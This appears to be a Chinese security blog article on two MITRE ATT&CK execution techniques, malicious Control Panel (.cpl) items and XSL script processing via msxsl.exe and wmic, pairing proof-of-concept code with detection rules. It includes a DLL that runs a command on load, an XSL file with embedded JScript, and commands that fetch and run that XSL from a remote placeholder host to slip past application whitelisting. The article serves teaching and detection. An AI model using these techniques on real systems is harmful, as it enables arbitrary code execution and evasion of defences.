如果要评选网络安全界近年热词排行的话，那么ATT&CK这个词一定是稳居top3的。我们经常看到关于ATT&CK的一些技术文章分享，那么ATT&CK到底是什么呢？MITRE
ATT&CK™ is a globally-accessible knowledge base of adversary tactics and
techniques based on real-world
observations.这是官网对于ATT&CK框架的解释，向我们表明了ATT&CK是一个基于真实世界所观测到的对抗性战术和知识库。其将众多的红队技术分门别类的列举了出来，对于红队的进攻有着很强的指导意义。而对于蓝队来说，ATT&CK框架为蓝队提供了一种相互沟通的语言，可以理解为一种通用货币，使得蓝队可以围绕着ATT&CK框架共筑安全长城。介于ATT&CK框架对于红蓝双方学习的重要性和必要性，我们团队将会对ATT&CK的研究专门写一个系列，具体介绍ATT&CK技术的复现和威胁特征提取。

ATT&CK框架将对抗性战术分为几个阶段，分别是Initial Access、Execution、Persistence、Privilege
Escalation、Defense Evasion、Credential Access、Discovery、Lateral
Movement、Collection、C2、Exfiltration、impact。我们首先从执行入手，带领大家初窥ATT&CK攻防。

##  **T1196-Control Panel Items** ****

控制面板项目是注册的可执行文件（.exe）或控制面板（.cpl）文件，CPL实际上是重命名的动态链接库（.dll）文件，可导出CPlApplet函数。控制面板项可以直接从命令行执行，也可以通过Control_RunDLL（API）调用或者直接双击文件。

攻击者可以使用控制面板项目来执行任意命令。恶意控制面板项目可以通过钓鱼邮件投递，也可以作为多阶段恶意软件的一个执行方法。控制面板项目，尤其是CPL文件，也可能会绕过应用程序或文件扩展名白名单。

### **命令执行** ****

// dllmain.cpp : 定义 DLL 应用程序的入口点。  
#include "stdafx.h"  
#include <windows.h>  
  
BOOL APIENTRY DllMain( HMODULE hModule,  
DWORD ul_reason_for_call,  
LPVOID lpReserved  
)  
{  
switch (ul_reason_for_call)  
{  
case DLL_PROCESS_ATTACH:  
WinExec("cmd.exe /c calc", SW_SHOW);  
case DLL_THREAD_ATTACH:  
case DLL_THREAD_DETACH:  
case DLL_PROCESS_DETACH:  
break;  
}  
return TRUE;  
}

这里我们用了点取巧的办法，直接将代码写在了attach里面，将上述代码编译为dll文件CPIApplet.dll(可以随意命名),然后将CPIApplet.dll重命名为CPIApplet.cpl

####  **技术复现** ****

control.exe c:\users\W10PC1\desktop\CPIApplet.cpl //这里cpl一定要采用绝对路径否则失败

![1.png](https://image.3001.net/images/20191120/1574229261_5dd4d50dc61af.png!small)

####  **技术复现(双击)**

![2.png](https://image.3001.net/images/20191120/1574229293_5dd4d52defa41.png!small)

####  **技术复现(使用导出函数Control_RunDLL)** ****

rundll32.exe shell32.dll,Control_RunDLL c:\users\W10PC1\desktop\CPIApplet.cpl

###  **威胁检测** ****

 **数据源** ：API监视，二进制文件元数据，DLL监视，Windows注册表，Windows事件日志，进程命令行参数，进程监视

 **进程特征：** （级别：高）

# 无论是通过control.exe执行、还是双击，最后都会通过rundll32调用shell32的导出函数Control_RunDLL来运行payload  
Image contains 'rundll32.exe' AND CommandLine contains 'Shell32.dll' AND
CommandLine contains 'Control_RunDLL' AND CommandLine regex '^.*\\.cpl$'

![3.png](https://image.3001.net/images/20191120/1574229320_5dd4d548acf3d.png!small)

**进程特征：** （级别：仅审计）

# 执行的payload文件后缀名不一定是cpl，可以是任意后缀，为了防止被绕过检测。需要记录其他相关调用Control_RunDLL API的行为  
Image contains 'rundll32.exe' AND CommandLine contains 'Shell32.dll' AND
CommandLine contains 'Control_RunDLL'

![4.png](https://image.3001.net/images/20191120/1574229346_5dd4d5624785f.png!small)

##  **T1220 XSL Script Processing** ****

XSL 指扩展样式表语言（ _E_ Xtensible _S_ tylesheet _L_ anguage）。万维网联盟 (W3C) 开始发展 XSL
的原因是：存在着对于基于 XML 的样式表语言的需求。在红蓝对抗中，使用XSL文件执行恶意代码有时可以帮助我们绕过APPLocker。下面介绍两种利用手段。

###  **命令执行** ****

####  **技术复现(MSXSL.EXE)** ****

msxsl.exe是微软用于命令行下处理XSL的一个程序，通过它我们可以执行XSL内的JavaScript进而执行系统命令。下载地址:<https://www.microsoft.com/en-us/download/confirmation.aspx?id=21714>。msxsl命令行接收形为 msxsl.exe {xmlfile}
{xslfile} 的参数。由于XSL算是一种特殊的XML，我们可以使用msxsl.exe {xslfile} {xslfile}调用xsl文件内的命令。

Ail.xsl  
  
<?xml version='1.0'?>  
<xsl:stylesheet version="1.0"  
xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"  
xmlns:msxsl="urn:schemas-microsoft-com:xslt"  
xmlns:user="<https://www.dbappsecurity.com.cn>">  
  
<msxsl:script language="JScript" implements-prefix="user">  
function xml(nodelist) {  
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");  
return nodelist.nextNode().xml;  
  
}  
</msxsl:script>  
<xsl:template match="/">  
<xsl:value-of select="user:xml(.)"/>  
</xsl:template>  
</xsl:stylesheet>

 **本地执行**

msxsl.exe Ail.xsl Ail.xsl

![5.png](https://image.3001.net/images/20191120/1574229372_5dd4d57ce6fdb.png!small)

 **远程执行**

msxsl.exe <http://xxx.xxx.xxx.xxx/Ail.xsl> <http://xxx.xxx.xxx.xxx/Ail.xsl>

![6.png](https://image.3001.net/images/20191120/1574229392_5dd4d5905751c.png!small)

#### **技术复现(WMIC.EXE)** ****

wmic可以通过形如:wmic.exe {wmic _command} /FORMAT:{xsl_ file}的方式执行xsl内的恶意代码。{wmic
command内可以填写任意的wmic可执行的命令}

 **本地执行**

wmic process get name /format:Ail.xsl

![7.png](https://image.3001.net/images/20191120/1574229411_5dd4d5a3cac80.png!small)

 **远程执行**

wmic process get name /format:"<http://xxx.xxx.xxx.xxx/Ail.xsl>"
//这里的format后的网址一定要加上双引号不然会报错

_![8.png](https://image.3001.net/images/20191120/1574229426_5dd4d5b21df78.png!small)_

##  **威胁检测** ****

 **数据源:** 进程监视，进程命令行参数，网络的进程使用，DLL监视

####  **MSXSL.EXE** ****

 **进程特征：** （级别：高）

#当MSXSL.EXE作为父进程创建其他进程时视为可疑  
ParentImage regex '^.*msxsl\\.exe$'

![9.png](https://image.3001.net/images/20191120/1574229560_5dd4d63811a77.png!small)

 **加载项特征** ：（级别：高）

#当MSXSL.EXE加载jscript.dll时视为可疑  
Image regex '^.*msxsl\\.exe$' AND ImageLoaded contains 'jscript.dll'

_![10.png](https://image.3001.net/images/20191120/1574229569_5dd4d6418b18e.png!small)_

####  **WMIC.EXE** ****

 **加载项特征** ：（级别：高）

#当WMIC.EXE加载jscript.dll视为可疑  
Image regex '^.*wmic\\.exe$' AND ImageLoaded contains 'jscript.dll'

_![11.png](https://image.3001.net/images/20191120/1574229588_5dd4d6546a42a.png!small)_

